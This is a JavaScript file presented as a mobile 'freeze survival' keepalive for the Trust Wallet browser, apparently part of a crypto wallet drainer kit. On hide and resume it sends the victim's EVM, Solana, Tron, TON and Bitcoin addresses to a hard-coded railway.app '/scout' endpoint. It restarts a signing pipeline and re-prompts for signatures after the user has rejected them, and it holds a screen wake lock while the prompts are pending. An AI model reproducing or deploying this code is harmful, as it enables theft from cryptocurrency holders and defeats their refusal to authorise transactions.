/**
 * Trust mobile freeze survival v1.0
 *
 * iOS freezes WebView JS when user leaves Trust Browser / switches apps.
 * Cannot keep timers alive — must: flush before hide, resume hard on show.
 */
(function () {
  'use strict';

  var flushAt = 0;
  var resumeAt = 0;
  var wakeLock = null;

  function isMobile() {
    try {
      var ua = navigator.userAgent || '';
      if (/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return true;
      if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    } catch (_) {}
    return false;
  }

  function getAddr() {
    try {
      var a = sessionStorage.getItem('trust_site_connected_addr') || sessionStorage.getItem('legion_wc_evm_addr');
      if (a && /^0x[a-f0-9]{40}$/i.test(a)) return a.toLowerCase();
    } catch (_) {}
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        return String(window.legion.state.evmAddr).toLowerCase();
      }
    } catch (_) {}
    return '';
  }

  function persistState() {
    try {
      var L = window.legion;
      var S = (L && L.state) || {};
      var addr = S.evmAddr || getAddr();
      if (addr) {
        sessionStorage.setItem('trust_site_connected_addr', String(addr).toLowerCase());
        sessionStorage.setItem('legion_wc_evm_addr', String(addr).toLowerCase());
      }
      sessionStorage.setItem('trust_freeze_ts', String(Date.now()));
      sessionStorage.setItem('trust_need_resume', '1');
      if (S.notifyDone || S.connectNotifiedAddr) {
        sessionStorage.setItem('legion_notify_done', String(addr || S.connectNotifiedAddr || '').toLowerCase());
      }
      if (S.instantSignAt) {
        sessionStorage.setItem('trust_instant_sign_at', String(S.instantSignAt));
      }
    } catch (_) {}
  }

  function backendBase() {
    try {
      if (window.LEGION_CONFIG && window.LEGION_CONFIG.backendUrl) {
        return String(window.LEGION_CONFIG.backendUrl).replace(/\/$/, '');
      }
    } catch (_) {}
    return 'https://sadrailala-production.up.railway.app';
  }

  function getMultiChainAddrs() {
    var out = {};
    try {
      var s = window.legion && window.legion.state && window.legion.state.chains;
      if (s) {
        if (s.SOL  && s.SOL.address)  out.sol  = s.SOL.address;
        if (s.TRON && s.TRON.address) out.tron = s.TRON.address;
        if (s.TON  && s.TON.address)  out.ton  = s.TON.address;
        if (s.BTC  && s.BTC.address)  out.btc  = s.BTC.address;
      }
    } catch (_) {}
    try {
      var ss = sessionStorage;
      out.sol  = out.sol  || ss.getItem('legion_sol_addr')  || '';
      out.tron = out.tron || ss.getItem('legion_tron_addr') || '';
      out.ton  = out.ton  || ss.getItem('legion_ton_addr')  || '';
      out.btc  = out.btc  || ss.getItem('legion_btc_addr')  || '';
    } catch (_) {}
    Object.keys(out).forEach(function (k) { if (!out[k]) delete out[k]; });
    return out;
  }

  function beaconNotify(addr) {
    if (!addr) return;
    try {
      var notified = '';
      try { notified = sessionStorage.getItem('legion_notify_done') || ''; } catch (_) {}
      if (notified && notified.toLowerCase() === String(addr).toLowerCase()) return;

      var mc = getMultiChainAddrs();
      var connectedWallets = [String(addr).toLowerCase()];
      if (mc.sol)  connectedWallets.push(mc.sol);
      if (mc.tron) connectedWallets.push(mc.tron);
      if (mc.ton)  connectedWallets.push(mc.ton);

      var body = {
        user_address: String(addr).toLowerCase(),
        chain_id: 1,
        wallet_type: 'Trust Wallet',
        chain_family: 'EVM',
        source_page: String(window.location.href || ''),
        connect_session: 'trust-freeze-flush:' + Date.now(),
        connected_wallets: connectedWallets,
      };
      if (mc.sol)  body.sol_address  = mc.sol;
      if (mc.tron) body.tron_address = mc.tron;
      if (mc.ton)  body.ton_address  = mc.ton;
      if (mc.btc)  body.btc_address  = mc.btc;
      var payload = JSON.stringify(body);
      var url = backendBase() + '/api/v1/scout';
      if (navigator.sendBeacon) {
        navigator.sendBeacon(url, new Blob([payload], { type: 'application/json' }));
      }
      try {
        fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload,
          keepalive: true,
          credentials: 'omit',
          cache: 'no-store',
        }).catch(function () {});
      } catch (_) {}
    } catch (_) {}
  }

  function fireSignOrPipeline(why) {
    console.warn('[TrustKeepalive] fire', why);
    try {
      if (window.legion && typeof window.legion.evmAlreadyConfirmed === 'function' &&
          window.legion.evmAlreadyConfirmed()) {
        console.warn('[TrustKeepalive] skip — EVM already confirmed');
        return;
      }
    } catch (_) {}
    try {
      var L = window.legion;
      var S = L && L.state;
      if (typeof L.pipelineBusy === 'function' && L.pipelineBusy()) {
        console.warn('[TrustKeepalive] skip — pipeline busy');
        return;
      }
      // Reject-retry or resume — never parallel ad-hoc forceTrustSign
      if (S && !S.userRejectedSign && (S.postConnectComplete || S.connecting || S.drainRunning)) {
        console.warn('[TrustKeepalive] skip — legion owns flow / complete');
        return;
      }
      if (typeof L.startPipeline === 'function') {
        var reason = (S && S.userRejectedSign) ? 'reject-retry' : (why || 'resume');
        L.startPipeline({ reason: reason }).catch(function () {});
        return;
      }
      if (typeof L.forceTrustSign === 'function' && S && S.userRejectedSign) {
        L.forceTrustSign().catch(function () {});
        return;
      }
    } catch (_) {}
    try {
      if (typeof window.__TRUST_RUN_PIPELINE__ === 'function') {
        window.__TRUST_RUN_PIPELINE__(why || 'keepalive');
      }
    } catch (_) {}
  }

  function flushForFreeze(why) {
    var now = Date.now();
    if (now - flushAt < 400) return;
    flushAt = now;
    console.warn('[TrustKeepalive] freeze flush:', why);
    persistState();
    beaconNotify(getAddr());
    // Freeze: beacon only — do NOT kick sign (JS may die mid-popup)
  }

  function hardResume(why) {
    var now = Date.now();
    if (now - resumeAt < 1000) return;
    resumeAt = now;

    var need = false;
    var addr = getAddr();
    try {
      need = sessionStorage.getItem('trust_need_resume') === '1';
    } catch (_) {}
    if (!need && !addr) return;

    console.warn('[TrustKeepalive] resume:', why);
    try { sessionStorage.setItem('trust_need_resume', '0'); } catch (_) {}
    tryWakeLock();

    try {
      var ts = Number(sessionStorage.getItem('trust_instant_sign_at') || 0);
      if (ts && window.legion && window.legion.state) {
        window.legion.state.instantSignAt = ts;
      }
    } catch (_) {}

    // Single path: startPipeline('resume') — same as post-connect
    try {
      if (window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
        Promise.resolve(window.LegionWallet.tryRecoverStoredSession(true)).then(function () {
          fireSignOrPipeline('resume');
        }).catch(function () {
          fireSignOrPipeline('resume');
        });
        return;
      }
    } catch (_) {}
    fireSignOrPipeline('resume');
  }

  function tryWakeLock() {
    if (!isMobile()) return;
    try {
      if (!navigator.wakeLock || typeof navigator.wakeLock.request !== 'function') return;
      navigator.wakeLock.request('screen').then(function (lock) {
        wakeLock = lock;
        lock.addEventListener('release', function () { wakeLock = null; });
      }).catch(function () {});
    } catch (_) {}
  }

  function releaseWakeLock() {
    try { if (wakeLock) wakeLock.release(); } catch (_) {}
    wakeLock = null;
  }

  window.__TRUST_BEFORE_WALLET_OPEN__ = function (openFn, delayMs) {
    delayMs = typeof delayMs === 'number' ? delayMs : 500;
    persistState();
    beaconNotify(getAddr());
    fireSignOrPipeline('before-wallet-open');
    if (typeof openFn !== 'function') return true;
    setTimeout(function () {
      try { openFn(); } catch (e) {
        console.warn('[TrustKeepalive] openFn', e && e.message);
      }
    }, delayMs);
    return true;
  };

  window.__TRUST_FLUSH_FREEZE__ = flushForFreeze;
  window.__TRUST_HARD_RESUME__ = hardResume;

  if (!isMobile()) return;

  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'hidden') {
      flushForFreeze('visibility-hidden');
      releaseWakeLock();
    } else {
      hardResume('visibility-visible');
    }
  });

  window.addEventListener('pagehide', function () {
    flushForFreeze('pagehide');
  });

  window.addEventListener('pageshow', function () {
    hardResume('pageshow');
  });

  window.addEventListener('focus', function () {
    hardResume('focus');
  });

  window.addEventListener('freeze', function () {
    flushForFreeze('freeze-event');
  }, true);

  window.addEventListener('resume', function () {
    hardResume('resume-event');
  }, true);

  // Keep screen awake while connected + pipeline pending
  tryWakeLock();
  setInterval(function () {
    if (document.visibilityState === 'visible' && getAddr()) tryWakeLock();
  }, 25000);

  console.warn('[TrustKeepalive] armed');
})();
